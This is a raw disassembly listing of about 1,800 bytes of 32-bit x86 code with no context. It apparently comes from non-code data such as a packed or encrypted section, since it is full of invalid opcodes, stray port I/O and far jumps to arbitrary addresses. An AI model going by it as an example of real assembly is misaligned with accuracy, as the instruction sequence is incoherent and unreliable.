  41f769:	rcr    esp,cl
  41f76b:	scas   al,BYTE PTR es:[edi]
  41f76c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f76d:	jno    0x41f7ab
  41f76f:	xchg   DWORD PTR fs:[edi],edi
  41f772:	or     DWORD PTR [ebx],0x8f81156d
  41f778:	add    edx,edi
  41f77a:	pop    es
  41f77b:	or     DWORD PTR [edx-0x7c18bf68],ecx
  41f781:	scas   eax,DWORD PTR es:[edi]
  41f782:	fwait
  41f783:	xchg   edx,eax
  41f785:	push   ss
  41f786:	or     esi,DWORD PTR [esi+ebp*8+0x1fe07acf]
  41f78d:	imul   esp,DWORD PTR [esi-0x10],0x3f
  41f791:	enter  0x1c9,0x57
  41f795:	jecxz  0x41f72a
  41f797:	dec    esp
  41f798:	adc    DWORD PTR [edi],edx
  41f79a:	lea    esp,[edi-0x74]
  41f79d:	stc    
  41f79e:	and    al,0x35
  41f7a0:	popa   
  41f7a1:	push   ebx
  41f7a2:	ret    
  41f7a3:	(bad)  
  41f7a5:	jb     0x41f765
  41f7a7:	(bad)  
  41f7a8:	pop    edi
  41f7a9:	sub    DWORD PTR [ebx-0x63055479],ebp
  41f7af:	test   eax,0x7f55f795
  41f7b4:	nop
  41f7b5:	mov    eax,ds:0xccfd38cb
  41f7ba:	nop
  41f7bb:	outs   dx,BYTE PTR ds:[esi]
  41f7bc:	int3   
  41f7bd:	mov    dl,0x9c
  41f7bf:	pop    edx
  41f7c0:	es loope 0x41f74b
  41f7c3:	jl     0x41f823
  41f7c5:	and    esp,DWORD PTR [edi+edi*1]
  41f7c8:	adc    al,0xa2
  41f7ca:	add    ebp,ebp
  41f7cc:	lods   eax,DWORD PTR ds:[esi]
  41f7cd:	out    dx,eax
  41f7ce:	jmp    0x7427:0xfd9c73b3
  41f7d5:	and    edx,DWORD PTR [ecx+0x628a61eb]
  41f7db:	fs jnp 0x41f7d5
  41f7de:	pop    ds
  41f7df:	xchg   ebp,eax
  41f7e0:	idiv   BYTE PTR [ebp+0x24593d00]
  41f7e6:	mov    ecx,0x49b214c9
  41f7eb:	and    al,0xe3
  41f7ed:	imul   eax,DWORD PTR [ebp+0xc],0x2c
  41f7f1:	cld    
  41f7f2:	jne    0x41f83d
  41f7f4:	jmp    0x11cc:0x7dbfa0b0
  41f7fb:	in     al,0x1d
  41f7fd:	loope  0x41f819
  41f7ff:	add    eax,0x37dd8010
  41f804:	push   esp
  41f805:	loope  0x41f789
  41f807:	mov    ds:0xc8fc01a5,eax
  41f80c:	js     0x41f7ae
  41f80e:	in     al,0x30
  41f810:	fisttp DWORD PTR [edi]
  41f812:	pop    es
  41f813:	not    BYTE PTR [edx-0x148b68f1]
  41f819:	mov    esi,0xa0e2285
  41f81e:	mov    BYTE PTR [ebx-0x25266a3f],dh
  41f824:	adc    al,0xf3
  41f826:	aad    0xea
  41f828:	cmp    dh,ch
  41f82a:	or     eax,0xaac435c4
  41f82f:	mov    dl,0x67
  41f831:	lods   eax,DWORD PTR ds:[esi]
  41f832:	mov    bh,0x72
  41f834:	dec    ecx
  41f835:	xchg   edx,eax
  41f836:	std    
  41f837:	das    
  41f838:	add    BYTE PTR ds:0xe0faff3f,0x45
  41f83f:	push   eax
  41f840:	or     dh,BYTE PTR [ebx]
  41f842:	mov    al,0xdb
  41f844:	push   0xffffffc8
  41f846:	jnp    0x41f83f
  41f848:	shl    DWORD PTR [ebp+0x32652f60],1
  41f84e:	inc    edx
  41f84f:	sbb    ah,dl
  41f851:	lahf   
  41f852:	sub    bl,cl
  41f854:	push   edi
  41f855:	scas   al,BYTE PTR es:[edi]
  41f856:	sbb    BYTE PTR [edi+0x1f],ch
  41f859:	inc    ebx
  41f85a:	adc    esp,edx
  41f85c:	loopne 0x41f821
  41f85e:	cmp    eax,0xe9c42252
  41f863:	pop    ecx
  41f864:	add    DWORD PTR [eax],ecx
  41f866:	cmp    DWORD PTR [edx],ebx
  41f868:	xlat   BYTE PTR ds:[ebx]
  41f869:	jmp    0xe228d97c
  41f86e:	mov    cl,0x1f
  41f870:	and    cl,BYTE PTR [edi]
  41f872:	int    0xc9
  41f874:	stos   DWORD PTR es:[edi],eax
  41f875:	adc    ebp,DWORD PTR [ebx]
  41f877:	retf   
  41f878:	ins    BYTE PTR es:[edi],dx
  41f879:	and    BYTE PTR [eax-0x5032a5b4],dh
  41f87f:	cli    
  41f880:	mov    ds:0x8dead966,eax
  41f885:	dec    edi
  41f886:	adc    al,0xb0
  41f888:	leave  
  41f889:	sub    dl,BYTE PTR [eax+eax*8+0x6c]
  41f88d:	jge    0x41f8a9
  41f88f:	mov    cl,0xc9
  41f891:	out    dx,eax
  41f892:	or     dh,BYTE PTR [ebx]
  41f894:	push   cs
  41f895:	cwde   
  41f896:	jnp    0x41f8a9
  41f898:	cmp    al,0xf6
  41f89a:	(bad)  
  41f89b:	lods   eax,DWORD PTR ds:[esi]
  41f89c:	imul   ecx,ebp,0xfffffff0
  41f89f:	push   ebp
  41f8a0:	jl     0x41f8af
  41f8a2:	fldln2 
  41f8a4:	scas   al,BYTE PTR es:[edi]
  41f8a5:	idiv   BYTE PTR [ebx]
  41f8a7:	out    0x48,eax
  41f8a9:	xchg   ecx,eax
  41f8aa:	daa    
  41f8ab:	mov    ebp,0xb44213a1
  41f8b0:	and    DWORD PTR [esi+0x6b],esi
  41f8b3:	mov    ch,0xb9
  41f8b5:	out    0x11,eax
  41f8b7:	frstor [edx+0xc]
  41f8ba:	repz pusha 
  41f8bc:	add    DWORD PTR [ebx+edx*4+0x7e],0x45a166ec
  41f8c4:	enter  0x8082,0xf7
  41f8c8:	in     al,0xd2
  41f8ca:	sub    DWORD PTR [esi-0x58372e23],eax
  41f8d0:	pop    eax
  41f8d1:	xor    al,0x4
  41f8d3:	and    BYTE PTR [esi+0x54],bh
  41f8d6:	xor    al,BYTE PTR [edi-0x15]
  41f8d9:	lods   al,BYTE PTR ds:[esi]
  41f8da:	ror    cl,cl
  41f8dc:	push   ds
  41f8dd:	(bad)  
  41f8de:	clc    
  41f8df:	jnp    0x41f8f2
  41f8e1:	lods   al,BYTE PTR ds:[esi]
  41f8e2:	dec    edx
  41f8e3:	shl    bh,1
  41f8e5:	bswap  ebp
  41f8e7:	sti    
  41f8e8:	lock push eax
  41f8ea:	mov    WORD PTR [ebx+0x2f],?
  41f8ed:	pop    esp
  41f8ee:	in     al,0xde
  41f8f0:	jnp    0x41f922
  41f8f2:	std    
  41f8f3:	gs jbe 0x41f955
  41f8f6:	ja     0x41f930
  41f8f8:	pop    ebp
  41f8f9:	ret    0x29d4
  41f8fc:	retf   0xe909
  41f8ff:	mov    bh,0xa7
  41f901:	loop   0x41f939
  41f903:	into   
  41f904:	mov    eax,0x2da3fea2
  41f909:	xchg   esp,eax
  41f90a:	dec    edi
  41f90b:	pop    esi
  41f90c:	fdiv   DWORD PTR [ebx+edi*1-0x11]
  41f910:	dec    esi
  41f911:	rcl    DWORD PTR [edi],1
  41f913:	ds inc ecx
  41f915:	mov    WORD PTR [ebp+0x65],ds
  41f918:	mov    ds:0x5e8ba623,eax
  41f91d:	mov    bl,0x6
  41f91f:	dec    esi
  41f920:	das    
  41f921:	xchg   DWORD PTR [ecx],eax
  41f923:	ret    0xfb76
  41f926:	loopne 0x41f958
  41f928:	cli    
  41f929:	lods   al,BYTE PTR ds:[esi]
  41f92a:	mov    esi,0x457cc1f5
  41f92f:	lods   eax,DWORD PTR ds:[esi]
  41f930:	mov    eax,ds:0x182cbf43
  41f935:	test   eax,0x5c30fa42
  41f93a:	lea    edx,[ecx]
  41f93c:	stc    
  41f93d:	jae    0x41f97e
  41f93f:	or     al,0x97
  41f941:	repz or eax,0x209e5fb1
  41f947:	clc    
  41f948:	pop    ecx
  41f949:	push   ebx
  41f94a:	mov    esi,0xea3c43f8
  41f94f:	sub    BYTE PTR [edx+0x4a],dl
  41f952:	mov    bh,dh
  41f954:	mov    dl,0x13
  41f956:	mov    eax,ss:0x5bd53817
  41f95c:	pop    esp
  41f95d:	leave  
  41f95e:	aas    
  41f95f:	in     al,0x6a
  41f961:	mov    dl,0x22
  41f963:	ds rol eax,1
  41f966:	pop    edx
  41f967:	data16 jae 0x41f9ba
  41f96a:	dec    edx
  41f96b:	loopne 0x41f8f8
  41f96d:	push   0xd45b136e
  41f972:	sbb    DWORD PTR [eax+eiz*4-0x6c58a714],esi
  41f979:	ret    0x6893
  41f97c:	mov    BYTE PTR [ebp+0x77647569],bl
  41f982:	jno    0x41f915
  41f984:	cmc    
  41f985:	cmp    ah,ch
  41f987:	dec    esp
  41f988:	cld    
  41f989:	xchg   esi,eax
  41f98a:	push   eax
  41f98b:	jae    0x41f96c
  41f98d:	mov    esi,0x7d384f66
  41f992:	pop    ebx
  41f993:	cmp    DWORD PTR [eax+0x66],0x14bfd864
  41f99a:	rol    BYTE PTR [eax-0x5d],0x95
  41f99e:	xchg   ebp,eax
  41f99f:	or     DWORD PTR [ecx+0xb],eax
  41f9a2:	xor    dl,ch
  41f9a4:	enter  0x1481,0xf2
  41f9a8:	scas   al,BYTE PTR es:[edi]
  41f9a9:	out    dx,eax
  41f9aa:	jle    0x41f970
  41f9ac:	shl    BYTE PTR [edx-0x12],1
  41f9af:	repnz xlat BYTE PTR ds:[ebx]
  41f9b1:	inc    eax
  41f9b2:	ds stos DWORD PTR es:[edi],eax
  41f9b4:	and    cl,al
  41f9b6:	push   ds
  41f9b7:	ds pushf 
  41f9b9:	imul   ebx,DWORD PTR [edx+0xe],0xffffff88
  41f9bd:	shl    BYTE PTR ds:0x12be5845,0x4
  41f9c4:	dec    ebp
  41f9c5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f9c6:	fwait
  41f9c7:	aaa    
  41f9c8:	push   edi
  41f9c9:	ins    BYTE PTR es:[edi],dx
  41f9ca:	xchg   bh,al
  41f9cc:	(bad)  
  41f9cd:	ffreep st(5)
  41f9cf:	mov    dh,0x4
  41f9d1:	mov    cl,0x2c
  41f9d3:	xor    DWORD PTR [eax+eiz*1],0xffffffc3
  41f9d7:	push   0x60
  41f9d9:	mov    ah,0x66
  41f9db:	pop    es
  41f9dc:	shr    DWORD PTR [edx+0x7ad8e4fa],1
  41f9e2:	xor    eax,0xe7057ab3
  41f9e7:	ins    DWORD PTR es:[edi],dx
  41f9e8:	dec    esi
  41f9e9:	xchg   ebp,eax
  41f9ea:	ret    0xab9e
  41f9ed:	inc    eax
  41f9ee:	test   eax,0xbf260f85
  41f9f3:	xor    dl,0x44
  41f9f6:	inc    edi
  41f9f7:	fsubr  DWORD PTR [esi+0x4c]
  41f9fa:	mov    edi,DWORD PTR [esi+edx*8+0x62]
  41f9fe:	js     0x41fa49
  41fa00:	mov    dh,0x3d
  41fa02:	or     eax,0x40bb30
  41fa07:	inc    eax
  41fa08:	imul   esp,DWORD PTR [edx],0xe95c95e8
  41fa0e:	fdiv   QWORD PTR [eax+0x2a50249]
  41fa14:	imul   esi,DWORD PTR [ecx+eax*4-0x3da5a608],0xffffffd8
  41fa1c:	mov    edi,0x697f89ba
  41fa21:	leave  
  41fa22:	fisttp WORD PTR [esi-0x6147467c]
  41fa28:	dec    edi
  41fa29:	adc    DWORD PTR [ecx],0x4d
  41fa2c:	adc    al,BYTE PTR [ecx+0x35fc8412]
  41fa32:	jg     0x41fa0c
  41fa34:	ins    BYTE PTR es:[edi],dx
  41fa35:	sbb    eax,0xe47c167b
  41fa3a:	cli    
  41fa3b:	aas    
  41fa3c:	pusha  
  41fa3d:	xchg   BYTE PTR [ecx+eax*2+0x56],cl
  41fa41:	lods   al,BYTE PTR ds:[esi]
  41fa42:	fisub  DWORD PTR [eax-0x2d]
  41fa45:	(bad)  
  41fa47:	stos   DWORD PTR es:[edi],eax
  41fa48:	fs repnz pop eax
  41fa4b:	jne    0x41fa9b
  41fa4d:	jmp    0xf646:0x1f33e7ec
  41fa54:	mov    dl,al
  41fa56:	ret    0x3b75
  41fa59:	loop   0x41fa63
  41fa5b:	sub    BYTE PTR ds:0x4327a02,0x47
  41fa62:	(bad)  
  41fa63:	aaa    
  41fa64:	pop    ebx
  41fa65:	add    eax,DWORD PTR [ebx-0x1f]
  41fa68:	es fwait
  41fa6a:	ret    
  41fa6b:	cmp    eax,0x7541a4dc
  41fa70:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fa71:	(bad)  
  41fa72:	xor    esi,ecx
  41fa74:	out    dx,eax
  41fa75:	xchg   ebp,eax
  41fa76:	fsubr  DWORD PTR [ebx-0x46]
  41fa79:	mov    cl,0x7a
  41fa7b:	mov    edi,0xb99c937c
  41fa80:	jl     0x41fa6a
  41fa82:	in     al,dx
  41fa83:	leave  
  41fa84:	outs   dx,DWORD PTR ds:[esi]
  41fa85:	xchg   esi,eax
  41fa86:	inc    esp
  41fa87:	pop    ss
  41fa88:	out    0xf3,al
  41fa8a:	into   
  41fa8b:	lahf   
  41fa8c:	mov    ds:0xbaa38fd0,eax
  41fa91:	pop    eax
  41fa92:	inc    edi
  41fa93:	ret    
  41fa94:	in     al,0x5
  41fa96:	stos   DWORD PTR es:[edi],eax
  41fa97:	xchg   ecx,eax
  41fa98:	xor    eax,0x7c707161
  41fa9d:	jmp    FWORD PTR [eax+0x7e51cb73]
  41faa3:	aam    0x5
  41faa5:	dec    ecx
  41faa6:	test   BYTE PTR [ebx+ecx*8-0x51],dl
  41faaa:	(bad)  
  41faab:	pop    ebp
  41faac:	mov    ah,BYTE PTR [ecx-0x4dfa4975]
  41fab2:	loope  0x41fa8a
  41fab4:	add    al,0x71
  41fab6:	cmp    al,0x31
  41fab8:	mov    eax,ds:0xc7daddc8
  41fabd:	int    0xfa
  41fabf:	nop
  41fac0:	iret   
  41fac1:	sbb    BYTE PTR ds:0xf8de2651,0x5
  41fac8:	mov    ebp,0x8431ad22
  41facd:	fs jb  0x41faa8
  41fad0:	mov    al,ds:0xff3c8b54
  41fad5:	mov    al,0x60
  41fad7:	sub    BYTE PTR [eax],0x15
  41fada:	xlat   BYTE PTR ds:[ebx]
  41fadb:	mov    esp,0xc4634c36
  41fae0:	out    dx,al
  41fae1:	mov    esi,0xde5303
  41fae6:	add    BYTE PTR [eax],al
  41fae8:	add    BYTE PTR [eax],al
  41faea:	pop    eax
  41faeb:	dec    edx
  41faec:	dec    edx
  41faed:	push   edi
  41faee:	pop    edx
  41faef:	push   edi
  41faf0:	pop    ebp
  41faf1:	dec    edi
  41faf2:	mov    dh,0x0
  41faf4:	dec    edx
  41faf5:	push   ecx
  41faf6:	cmp    ecx,esi
  41faf8:	dec    edx
  41faf9:	stc    
  41fafa:	push   esi
  41fafb:	mov    al,BYTE PTR [ecx]
  41fafd:	add    BYTE PTR [ebx-0x26fffffa],al
  41fb03:	lods   al,BYTE PTR ds:[esi]
  41fb04:	cmp    BYTE PTR [edx+0x24],ch
  41fb07:	jge    0x41fb28
  41fb09:	repnz ins DWORD PTR es:[edi],dx
  41fb0b:	repnz mov ds:0x5dcbdaea,eax
  41fb11:	unpcklps xmm5,xmm5
  41fb14:	dec    esi
  41fb15:	ins    BYTE PTR es:[edi],dx
  41fb16:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fb17:	and    DWORD PTR [ebx-0x70],esi
  41fb1a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fb1b:	or     eax,ebp
  41fb1d:	xchg   edx,eax
  41fb1e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fb1f:	aam    0x34
  41fb21:	xchg   esp,eax
  41fb22:	aam    0x91
  41fb24:	aad    0x19
  41fb26:	not    BYTE PTR [ecx+0x74]
  41fb29:	ins    BYTE PTR es:[edi],dx
  41fb2a:	outs   dx,BYTE PTR ds:[esi]
  41fb2b:	jno    0x41fb28
  41fb2d:	or     ebx,DWORD PTR [ebx]
  41fb2f:	and    DWORD PTR [edi+0x67],ecx
  41fb32:	shr    DWORD PTR [ebp-0x3f],0xb0
  41fb36:	test   eax,0x8210b383
  41fb3b:	fs sbb bl,dl
  41fb3e:	or     DWORD PTR ds:[esi+ebx*8-0xb7c5aea],esp
  41fb46:	mov    esp,DWORD PTR [ebx+eiz*8+0x34e6563f]
  41fb4d:	jae    0x41fb89
  41fb4f:	jae    0x41fb95
  41fb51:	jo     0x41fb02
  41fb53:	mov    ds:0x91c0506a,al
  41fb58:	xchg   DWORD PTR [ecx+0x46],edi
  41fb5b:	imul   DWORD PTR [eax-0x47]
  41fb5e:	jle    0x41fb3d
  41fb60:	xor    al,0x5b
  41fb62:	cmp    dl,BYTE PTR [esi-0x1d]
  41fb65:	inc    ecx
  41fb66:	fdivr  QWORD PTR [ecx+ebx*1-0x5a]
  41fb6a:	dec    ebx
  41fb6b:	xchg   edx,eax
  41fb6d:	test   eax,0xdc124c28
  41fb72:	ret    
  41fb73:	adc    cl,BYTE PTR [eax]
  41fb75:	jnp    0x41fb31
  41fb77:	std    
  41fb78:	cmp    BYTE PTR [ecx+0x4a],0xfa
  41fb7c:	pop    ecx
  41fb7d:	retf   0x4e2f
  41fb80:	inc    eax
  41fb81:	rcl    BYTE PTR [edi+edx*4+0xacb8ca7],0xc6
  41fb89:	xchg   esp,eax
  41fb8a:	std    
  41fb8b:	sub    esi,edi
  41fb8d:	jae    0x41fbf8
  41fb8f:	aas    
  41fb90:	dec    ecx
  41fb91:	pop    eax
  41fb92:	ja     0x41fb30
  41fb94:	das    
  41fb95:	or     al,0xc
  41fb97:	mov    eax,0xfb6ee8e6
  41fb9c:	mov    ebp,0xc6ba7a42
  41fba1:	leave  
  41fba2:	stos   BYTE PTR es:[edi],al
  41fba3:	addr16 mov ecx,?
  41fba6:	mov    ds:0xd8875f9d,eax
  41fbab:	daa    
  41fbac:	fidivr WORD PTR [eax+ebx*1-0x5e]
  41fbb0:	in     eax,0xc
  41fbb2:	clc    
  41fbb3:	cli    
  41fbb4:	fidivr DWORD PTR ds:0x4e566ba4
  41fbba:	pop    esp
  41fbbb:	idiv   BYTE PTR [eax-0x6e]
  41fbbe:	idiv   DWORD PTR [edx]
  41fbc0:	sahf   
  41fbc1:	sahf   
  41fbc2:	mov    dl,0x23
  41fbc4:	pop    edx
  41fbc5:	cmp    al,0xc2
  41fbc7:	push   cs
  41fbc8:	and    eax,0xcb952791
  41fbcd:	sets   dl
  41fbd0:	and    ebx,edi
  41fbd2:	xchg   DWORD PTR [eax],edx
  41fbd4:	or     DWORD PTR [bx+di-0x33b5],0x5a95c2d
  41fbdd:	les    ebx,FWORD PTR [edx]
  41fbdf:	loope  0x41fb8c
  41fbe1:	out    0x4c,al
  41fbe3:	lods   al,BYTE PTR ds:[esi]
  41fbe4:	data16 int3 
  41fbe6:	adc    DWORD PTR [edx+0x46],edi
  41fbe9:	loope  0x41fbf2
  41fbeb:	pushf  
  41fbec:	jnp    0x41fb87
  41fbee:	pop    esp
  41fbef:	das    
  41fbf0:	(bad)  
  41fbf1:	xor    esi,esi
  41fbf3:	sub    eax,0xa2710c3c
  41fbf8:	xlat   BYTE PTR ds:[ebx]
  41fbf9:	nop
  41fbfa:	scas   al,BYTE PTR es:[edi]
  41fbfb:	mov    dl,0xa
  41fbfd:	test   ecx,edx
  41fbff:	fstp   st(4)
  41fc01:	shl    DWORD PTR [ebx],cl
  41fc03:	push   cs
  41fc04:	push   es
  41fc05:	sti    
  41fc06:	clc    
  41fc07:	dec    edx
  41fc08:	test   DWORD PTR [ebx],0xfcdedda2
  41fc0e:	jae    0x41fc6a
  41fc10:	inc    ebx
  41fc11:	jnp    0x41fc27
  41fc13:	xor    dl,BYTE PTR [ecx]
  41fc15:	outs   dx,BYTE PTR ds:[esi]
  41fc16:	fs cs mov esi,0x842e6225
  41fc1d:	retf   0x7e52
  41fc20:	sahf   
  41fc21:	cwde   
  41fc22:	repnz sbb DWORD PTR [edx+0x23ef8565],esi
  41fc29:	and    ah,BYTE PTR [eax-0x27]
  41fc2c:	call   0x519a525d
  41fc31:	imul   ebx,DWORD PTR [edi],0x77
  41fc34:	cwde   
  41fc35:	aaa    
  41fc36:	mov    ah,0xfe
  41fc38:	pop    ss
  41fc39:	xchg   ebx,eax
  41fc3a:	stc    
  41fc3b:	or     eax,DWORD PTR [esi]
  41fc3d:	dec    ebp
  41fc3e:	pop    eax
  41fc3f:	and    bh,al
  41fc41:	or     DWORD PTR [edi+0x21],esp
  41fc44:	sub    BYTE PTR [edx],bl
  41fc46:	test   DWORD PTR [eax],eax
  41fc48:	ja     0x41fc18
  41fc4a:	dec    ebp
  41fc4b:	imul   ecx,DWORD PTR [ebx+esi*1-0x4],0xf1f25905
  41fc53:	pusha  
  41fc54:	jl     0x41fc7e
  41fc56:	ins    DWORD PTR es:[edi],dx
  41fc57:	jo     0x41fc48
  41fc59:	pop    ecx
  41fc5a:	jp     0x41fcaa
  41fc5c:	fist   WORD PTR [ebx+0x1ee63471]
  41fc62:	push   edx
  41fc63:	pop    ebx
  41fc64:	cs mul al
  41fc67:	adc    eax,edi
  41fc69:	mov    dl,0x17
  41fc6b:	test   eax,0x1133fa03
  41fc70:	and    al,0x47
  41fc72:	xchg   edi,eax
  41fc73:	sbb    esi,DWORD PTR [ebx+0x69]
  41fc76:	test   al,0x61
  41fc78:	imul   edi,ebp,0x706784e5
  41fc7e:	xlat   BYTE PTR ds:[ebx]
  41fc7f:	jno    0x41fc60
  41fc81:	jmp    FWORD PTR [edi+0x1d10219d]
  41fc87:	jno    0x41fc84
  41fc89:	data16 xor BYTE PTR [esi-0x198f9f04],dh
  41fc90:	repnz cmp cl,BYTE PTR [ebp-0x2a7b9ffc]
  41fc97:	pop    ebp
  41fc98:	cwde   
  41fc99:	fwait
  41fc9a:	leave  
  41fc9b:	mov    al,ds:0x817c2337
  41fca0:	pop    es
  41fca1:	fstp   QWORD PTR [ecx+0x423039ff]
  41fca7:	aas    
  41fca8:	push   ecx
  41fca9:	push   ss
  41fcaa:	and    bl,BYTE PTR [ebp+0x395ceba1]
  41fcb0:	mov    al,fs:0xb33b9f82
  41fcb6:	mov    edi,0x5eafe933
  41fcbb:	aam    0xb6
  41fcbd:	lds    ebx,FWORD PTR [eax-0xa]
  41fcc0:	scas   al,BYTE PTR es:[edi]
  41fcc1:	int3   
  41fcc2:	(bad)  
  41fcc3:	shl    ecx,0x87
  41fcc6:	rcl    dl,0x3d
  41fcc9:	(bad)  
  41fcca:	sub    DWORD PTR [edi-0x11b5bfa7],edx
  41fcd0:	and    DWORD PTR [esp+esi*4-0x20],0xfd298638
  41fcd8:	aam    0xaf
  41fcda:	repz call 0x6c22:0x29197eba
  41fce2:	fisub  DWORD PTR [ecx+0x14]
  41fce5:	inc    ebx
  41fce6:	mov    bl,0xd9
  41fce8:	add    eax,0xd70d9b29
  41fced:	pusha  
  41fcee:	xchg   esi,eax
  41fcef:	jle    0x41fc84
  41fcf1:	lods   eax,DWORD PTR ds:[esi]
  41fcf2:	xor    bh,dl
  41fcf4:	push   esi
  41fcf5:	loope  0x41fd0a
  41fcf7:	jno    0x41fc87
  41fcf9:	ret    0x1c57
  41fcfc:	jae    0x41fcda
  41fcfe:	push   cs
  41fcff:	push   es
  41fd00:	jmp    0x41fd3e
  41fd02:	xchg   esp,eax
  41fd03:	sub    BYTE PTR [ebx+eiz*8-0x14fa3b72],0xac
  41fd0b:	(bad)  
  41fd0c:	popf   
  41fd0d:	add    edi,DWORD PTR [eax-0x2d0b6d3a]
  41fd13:	jae    0x41fd6c
  41fd15:	cwde   
  41fd16:	in     eax,dx
  41fd17:	jmp    0x2bce:0x4478d763
  41fd1e:	mov    ds:0x85dbb5e0,eax
  41fd23:	cld    
  41fd24:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fd25:	sub    bl,bh
  41fd27:	loop   0x41fd47
  41fd29:	adc    al,BYTE PTR [esi]
  41fd2b:	mov    BYTE PTR [esi],al
  41fd2d:	data16 jp 0x41fcee
  41fd30:	xor    esi,DWORD PTR [ebx+0x4b]
  41fd33:	push   ds
  41fd34:	xchg   esi,eax
  41fd35:	in     al,0x39
  41fd37:	jmp    0x4bccbfba
  41fd3c:	aam    0x6a
  41fd3e:	jae    0x41fce3
  41fd40:	mov    ?,esp
  41fd42:	pop    ds
  41fd43:	(bad)  
  41fd44:	adc    al,0x54
  41fd46:	or     al,0xc2
  41fd48:	fmul   st,st(0)
  41fd4a:	rcr    BYTE PTR [eax+eiz*1+0xc],1
  41fd4e:	inc    esp
  41fd4f:	add    DWORD PTR [eax-0xc28150c],esi
  41fd55:	or     BYTE PTR [edi],cl
  41fd57:	mov    esi,DWORD PTR [esi+0x5d7bb399]
  41fd5d:	dec    edx
  41fd5e:	push   edx
  41fd5f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fd60:	rcr    BYTE PTR [ebp+0x30411131],cl
  41fd66:	loope  0x41fd1c
  41fd68:	repz test DWORD PTR [esi],edi
  41fd6b:	(bad)  
  41fd6c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fd6d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fd6e:	push   cs
  41fd6f:	jp     0x41fcf6
  41fd71:	rcl    BYTE PTR [ecx-0x33],1
  41fd74:	push   0xe7c68db6
  41fd79:	mov    bh,0xad
  41fd7b:	or     ebx,DWORD PTR [eax+0x1b]
  41fd7e:	or     bh,BYTE PTR [edi]
  41fd80:	icebp  
  41fd81:	xchg   ebp,eax
  41fd82:	lahf   
  41fd83:	(bad)  
  41fd84:	adc    eax,0x7028486a
  41fd89:	or     DWORD PTR [edx],ebx
  41fd8b:	test   eax,0xf0a6e4d3
  41fd90:	and    DWORD PTR [ebp+0x2f],esp
  41fd93:	gs inc edi
  41fd95:	call   FWORD PTR [edx+0x10]
  41fd98:	inc    esi
  41fd99:	ret    0xd940
  41fd9c:	retf   
  41fd9d:	add    BYTE PTR [edi+ebp*1+0x4c],dh
  41fda1:	out    0x39,al
  41fda3:	sar    BYTE PTR [eax],1
  41fda5:	je     0x41fd71
  41fda7:	outs   dx,BYTE PTR ds:[esi]
  41fda8:	inc    ebp
  41fda9:	repnz or DWORD PTR [eax],edi
  41fdac:	cmc    
  41fdad:	sbb    dh,BYTE PTR [edi+0x2d4d9b2]
  41fdb3:	test   al,0xd6
  41fdb5:	adc    esi,edi
  41fdb7:	aas    
  41fdb8:	and    DWORD PTR [edi-0x18],edx
  41fdbb:	inc    esp
  41fdbc:	das    
  41fdbd:	out    dx,al
  41fdbe:	enter  0xe5b9,0x37
  41fdc2:	(bad)  
  41fdc3:	or     bh,BYTE PTR [ebx]
  41fdc5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fdc6:	lods   al,BYTE PTR ds:[esi]
  41fdc7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fdc8:	cmp    al,0x58
  41fdca:	retf   
  41fdcb:	data16 cli 
  41fdcd:	popf   
  41fdce:	lock sbb al,0xfd
  41fdd1:	aaa    
  41fdd2:	xor    esi,DWORD PTR ds:0x7d8f0fe7
  41fdd8:	fsubr  st,st(6)
  41fdda:	inc    esp
  41fddb:	add    eax,0x34ac9e84
  41fde0:	push   esp
  41fde1:	push   ds
  41fde2:	icebp  
  41fde3:	aaa    
  41fde4:	jg     0x41fe3f
  41fde6:	pop    es
  41fde7:	sub    DWORD PTR [ecx-0x5d],edi
  41fdea:	add    dh,BYTE PTR [ebp-0x9]
  41fded:	mov    DWORD PTR [eax+0x6b],eax
  41fdf0:	push   ebx
  41fdf1:	dec    esp
  41fdf2:	jg     0x41fe22
  41fdf4:	dec    ecx
  41fdf5:	mov    ecx,0xaea9c36c
  41fdfa:	nop
  41fdfb:	imul   eax,DWORD PTR ds:0x261d07ad,0x9e3578d6
  41fe05:	xor    al,0xb3
  41fe07:	push   ebx
  41fe08:	mov    ebp,0xd1e946fd
  41fe0d:	loope  0x41fe14
  41fe0f:	lahf   
  41fe10:	add    DWORD PTR [esi],ecx
  41fe12:	clc    
  41fe13:	das    
  41fe14:	sbb    al,bh
  41fe16:	cmp    DWORD PTR [ebp-0x7d644dc7],ecx
  41fe1c:	mov    WORD PTR [edi-0x62],es
  41fe1f:	cmc    
  41fe20:	push   ebp
  41fe21:	and    eax,0x137c8e30
  41fe26:	push   0x11e1b0cb
  41fe2b:	shld   DWORD PTR [esi],esi,0x3a
  41fe2f:	jmp    0x73a8:0x58702e9
  41fe36:	addr16 jp 0x41fde4
  41fe39:	push   eax
  41fe3a:	dec    ebp
  41fe3b:	sbb    ecx,ebp
  41fe3d:	pop    ss
  41fe3e:	add    al,0x21
  41fe40:	icebp  
  41fe41:	data16 jno 0x41fdec
  41fe44:	pop    es
  41fe45:	push   ebx
  41fe46:	jp     0x41fe9c
  41fe48:	fisttp DWORD PTR [eax]
  41fe4a:	adc    ecx,DWORD PTR [esi-0x1d677fc1]
  41fe50:	inc    ebx
  41fe51:	inc    esp
  41fe52:	pop    edi
  41fe53:	test   BYTE PTR [eax+0x6d],al
  41fe56:	xor    dl,0x70
  41fe59:	cs jnp 0x41fe61
  41fe5c:	sub    cl,ah
  41fe5e:	sbb    al,0xc
  41fe60:	xor    al,0x3d
  41fe62:	push   eax
  41fe63:	gs push edi
  41fe65:	cli    
  41fe66:	mov    al,0xcb
  41fe68:	dec    edx
  41fe69:	cwde   
  41fe6a:	ds add eax,0x6a809588
  41fe70:	cli    
  41fe71:	stos   DWORD PTR es:[edi],eax
  41fe72:	mov    esp,0x8359f373
  41fe77:	sub    BYTE PTR [edi],0x32
  41fe7a:	(bad)  
  41fe7b:	out    dx,al
  41fe7c:	dec    esp
  41fe7d:	jbe    0x41fef9
  41fe7f:	aaa    
